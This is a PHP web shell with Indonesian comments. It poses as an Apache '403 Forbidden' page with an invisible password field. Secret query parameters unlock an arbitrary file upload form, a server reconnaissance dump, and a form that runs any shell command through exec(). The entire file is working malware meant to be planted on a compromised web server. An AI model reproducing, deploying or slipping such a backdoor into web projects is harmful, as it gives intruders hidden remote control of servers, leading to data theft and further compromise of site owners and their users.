<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Fungsi untuk mengambil informasi server
function getServerInfo() {
    $info = [];
    $info['Uname'] = php_uname();
    $info['User'] = get_current_user();
    $info['ServerIP'] = $_SERVER['SERVER_ADDR'];
    $info['DateTime'] = date('Y-m-d H:i:s');
    $info['Domains'] = $_SERVER['HTTP_HOST'];
    $info['HDD'] = shell_exec("df -h");
    $info['Useful'] = "PHP, MySQL, and other useful tools.";
    $info['Downloader'] = "Not specified";
    $info['Disable Functions'] = ini_get('disable_functions');

    // Informasi tentang ekstensi
    $info['CURL'] = extension_loaded('curl') ? 'Enabled' : 'Disabled';
    $info['SSH2'] = extension_loaded('ssh2') ? 'Enabled' : 'Disabled';
    $info['Magic Quotes'] = 'Not Applicable'; // Ganti dengan 'Not Applicable'
    $info['MySQL'] = extension_loaded('mysqli') ? 'Enabled' : 'Disabled';
    $info['MSSQL'] = extension_loaded('sqlsrv') ? 'Enabled' : 'Disabled';
    $info['PostgreSQL'] = extension_loaded('pgsql') ? 'Enabled' : 'Disabled';
    $info['Oracle'] = extension_loaded('oci8') ? 'Enabled' : 'Disabled';
    $info['CGI'] = ini_get('cgi.force_redirect') ? 'Enabled' : 'Disabled';
    $info['Open_basedir'] = ini_get('open_basedir') ?: 'None';
    $info['Safe_mode_exec_dir'] = ini_get('safe_mode_exec_dir') ?: 'None';
    $info['Safe_mode_include_dir'] = ini_get('safe_mode_include_dir') ?: 'None';
    $info['SoftWare'] = php_uname('s') . ' ' . php_uname('r');
    $info['PWD'] = getcwd();

    return $info;
}

// Cek jika query string 'ganteng' atau 'kontol' ada
if (isset($_GET["ganteng"]) || isset($_GET["kontol"])) {
    // Jika parameter "ganteng" ada, tampilkan uname dan daftar fungsi yang dinonaktifkan
    if (isset($_GET["ganteng"])) {
        echo "<font color=#000000>" . php_uname() . "</font>";
        $disable_functions = ini_get("disable_functions");
        echo $disable_functions; // Menampilkan daftar fungsi yang dinonaktifkan
        
        // Form upload file
        echo "<form method='post' enctype='multipart/form-data'>";
        echo "<input type='file' name='f'><input name='k' type='submit' id='k' value='upload'><br>";
        if (isset($_POST["k"]) && $_POST["k"] == "upload") {
            if (@copy($_FILES["f"]["tmp_name"], $_FILES["f"]["name"])) {
                echo "<b>" . $_FILES["f"]["name"] . " berhasil diupload.</b>";
            } else {
                echo "<b>Gagal upload Bjirr..</b>";
            }
        }
    }

    // Jika parameter "kontol" ada, tampilkan informasi server dan form perintah
    if (isset($_GET['kontol'])) {
        echo "<h1>Informasi Sistem</h1>";
        $serverInfo = getServerInfo();
        echo "<pre>";
        foreach ($serverInfo as $key => $value) {
            echo "$key: $value\n";
        }
        echo "</pre>";

        // Menampilkan form untuk memasukkan perintah
        echo '<form action="" method="post">
                <label for="command">Masukkan Perintah:</label><br>
                <input type="text" id="command" name="command" required><br><br>
                <input type="submit" value="Eksekusi">
              </form>';

        // Memeriksa apakah form telah disubmit
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
            $command = escapeshellcmd($_POST['command']) . ' 2>&1';
            $output = [];
            $returnVar = 0;

            exec($command, $output, $returnVar);

            // Menampilkan hasil eksekusi
            if (!empty($output)) {
                echo "<h2>Hasil Perintah:</h2>";
                foreach ($output as $line) {
                    echo htmlspecialchars($line) . "<br>";
                }
            } else {
                echo "<p>Tidak ada output dari perintah yang dijalankan.</p>";
            }

            if ($returnVar !== 0) {
                echo "<p style='color:red;'>Terjadi kesalahan saat menjalankan perintah.</p>";
            }
        }
    }
} else {
    // Jika tidak ada parameter "ganteng" atau "kontol", tampilkan halaman 403 dengan form login
    ?>

    <!DOCTYPE html>
    <html>
       <head>
          <title>403 Forbidden</title>
       </head>
       <body>
          <h1>Forbidden</h1>
          <p>You don't have permission to access <?php echo $_SERVER['REQUEST_URI']; ?> on this server.</p>
          <hr>
          <address><?php echo $_SERVER['SERVER_SOFTWARE']; ?> Server at <?php echo $_SERVER['SERVER_NAME']; ?> Port <?php echo $_SERVER['SERVER_PORT']; ?></address>
          <form method="post">
             <input style="position: absolute; bottom: 0; left: 50%; transform: translateX(-50%); background-color: #fff; border: 1px solid #fff; text-align: center;" type="password" name="password">
          </form>
       </body>
    </html>

<?php
}
?>
